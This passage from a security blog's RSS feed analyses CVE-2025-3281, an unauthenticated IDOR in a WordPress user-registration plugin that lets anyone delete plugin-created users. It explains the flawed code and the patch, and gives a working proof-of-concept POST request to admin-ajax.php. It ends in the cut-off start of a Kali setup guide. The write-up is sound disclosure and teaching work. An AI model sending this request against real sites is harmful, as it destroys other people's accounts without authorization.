&lt;code&gt;urm_user_just_created&lt;/code&gt; meta key:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;if ( ! $is_user_created ) {&#xA;    wp_send_json_error( ... );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that as long as the user was created through the plugin’s registration flow, the condition passes — &lt;strong&gt;there is no check to ensure that the requester is authorized to act on that user&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Note: the user must be registered via the &lt;strong&gt;Registration&lt;/strong&gt; form at&#xA;&lt;a href=&#34;http://localhost/registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/registration/&lt;/a&gt;, not via &lt;strong&gt;Membership Registration&lt;/strong&gt; at&#xA;&lt;a href=&#34;http://localhost/membership-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/membership-registration/&lt;/a&gt;, for &lt;code&gt;$is_user_created&lt;/code&gt; to be valid.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Next, the function calls:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$stripe_subscription = $stripe_service-&amp;gt;create_subscription(&#xA;    $customer_id,&#xA;    $payment_method_id,&#xA;    $member_id&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The return value determines the next execution path. If &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; is &lt;code&gt;false&lt;/code&gt;, the following code deletes the user corresponding to &lt;code&gt;$member_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;    wp_send_json_success( $stripe_subscription );&#xA;} else {&#xA;    wp_delete_user( absint( $member_id ) );&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To force &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; to be &lt;code&gt;false&lt;/code&gt;, an attacker can &lt;strong&gt;omit or provide invalid values for &lt;code&gt;$customer_id&lt;/code&gt; and &lt;code&gt;$payment_method_id&lt;/code&gt;&lt;/strong&gt;, causing the subscription creation to fail and triggering the error branch.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;This leads to a severe &lt;strong&gt;IDOR (Insecure Direct Object Reference)&lt;/strong&gt; vulnerability, allowing arbitrary deletion of user accounts.&lt;/p&gt;&#xA;&lt;p&gt;The patch in version &lt;code&gt;4.2.2&lt;/code&gt; adds &lt;strong&gt;permission checks before performing operations on the user&lt;/strong&gt;, preventing IDOR:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $member_id ) ) {&#xA;&#x9;wp_send_json_error(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Before calling &lt;code&gt;$stripe_service-&amp;gt;create_subscription()&lt;/code&gt;, the function verifies whether the requester has permission to edit the user with &lt;code&gt;member_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If not, it returns an error and &lt;strong&gt;does not delete the user&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#39; alt=&#34;Diff&#34; height=&#34;847&#34; width=&#34;1795&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This ensures that only authorized users can trigger operations that lead to &lt;code&gt;wp_delete_user()&lt;/code&gt;, effectively closing the &lt;strong&gt;IDOR vulnerability&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The Membership feature is disabled by default. You must enable it at&#xA;&lt;a href=&#34;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registers multiple action hooks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;$ajax_events&lt;/code&gt; list, &lt;strong&gt;&lt;code&gt;create_stripe_subscription&lt;/code&gt;&lt;/strong&gt; is marked as &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means the plugin registers both:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_create_stripe_subscription&#xA;wp_ajax_nopriv_user_registration_membership_create_stripe_subscription&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → for authenticated users&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → for &lt;strong&gt;unauthenticated users&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Therefore, &lt;strong&gt;anyone can send a request to this endpoint&lt;/strong&gt;, including unauthenticated attackers. When the request is processed:&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;create_stripe_subscription&lt;/code&gt; action becomes an &lt;strong&gt;IDOR exploitation point&lt;/strong&gt;, allowing deletion of any user created via the plugin, even without authentication.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress routes request via wp_ajax_nopriv_*&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;create_stripe_subscription() executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Read POST parameters (member_id, customer_id, payment_method_id)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Check get_user_meta(member_id, &amp;#39;urm_user_just_created&amp;#39;)&amp;#34;]&#xA;&#xA;F --&amp;gt;|Not exists| G[&amp;#34;Request rejected&amp;#34;]&#xA;F --&amp;gt;|Exists| H[&amp;#34;Call create_subscription()&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;Stripe subscription valid?&amp;#34;}&#xA;&#xA;I --&amp;gt;|Yes| J[&amp;#34;Return success response&amp;#34;]&#xA;I --&amp;gt;|No| K[&amp;#34;wp_delete_user(member_id)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user deleted&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Visit &lt;code&gt;/membership-registration/?&lt;/code&gt; and obtain the &lt;code&gt;_confirm_payment_nonce&lt;/code&gt; value from the response.&lt;/li&gt;&#xA;&lt;li&gt;Send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US&#xA;&#xA;action=user_registration_membership_create_stripe_subscription&amp;amp;_ajax_nonce=472f729de7&amp;amp;member_id=member_id_to_delete&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-3281&lt;/strong&gt; vulnerability arises because &lt;code&gt;create_stripe_subscription()&lt;/code&gt; allows unauthenticated access while directly processing user-controlled input. The lack of permission checks on &lt;code&gt;member_id&lt;/code&gt;, combined with exposure through &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;, enables attackers to delete user accounts arbitrarily.&lt;/p&gt;&#xA;&lt;p&gt;The patch in version &lt;strong&gt;4.2.2&lt;/strong&gt; fixes this by enforcing proper authorization checks using &lt;code&gt;current_user_can&lt;/code&gt;, fully preventing the IDOR issue.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces do not replace proper authorization checks.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; endpoints must be strictly controlled.&lt;/li&gt;&#xA;&lt;li&gt;Sensitive actions (user deletion, state changes) should never rely solely on client-supplied data.&lt;/li&gt;&#xA;&lt;li&gt;Always enforce permission checks (&lt;code&gt;current_user_can&lt;/code&gt;) when modifying user resources.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities often stem from missing business-logic authorization, not just technical mistakes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-2-1-insecure-direct-object-reference-to-unauthenticated-limited-user-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt;= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Setup Kali Linux for Pentest</title>
      <link>http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/</guid>
      <category domain="http://localhost:1313/categories/pentest/">Pentest</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-setup-kali-for-pentest/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;update--upgrade&#34;&gt;&lt;span&gt;Update &amp;amp; Upgrade&lt;/span&gt;&#xA;  &lt;a href=&#34;#update--upgrade&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt update -y &amp;amp;&amp;amp; sudo apt update -y &amp;amp;&amp;amp; sudo apt full-upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-fcitx5-unikey&#34;&gt;&lt;span&gt;Install Fcitx5 Unikey&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-fcitx5-unikey&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Configure:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;fcitx5-configtool&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-vscode&#34;&gt;&lt;span&gt;Install VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Download from &lt;a href=&#34;https://code.visualstudio.com/download&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://code.visualstudio.com/download&lt;/a&gt; or use terminal:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget -O vscode.deb &amp;#34;https://code.visualstudio.com/sha/download?build=stable&amp;amp;os=linux-deb-x64&#xA;sudo apt install ./vscode.deb&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;install-hugo-for-blog&#34;&gt;&lt;span&gt;Install Hugo for Blog&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-hugo-for-blog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Download&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;ol 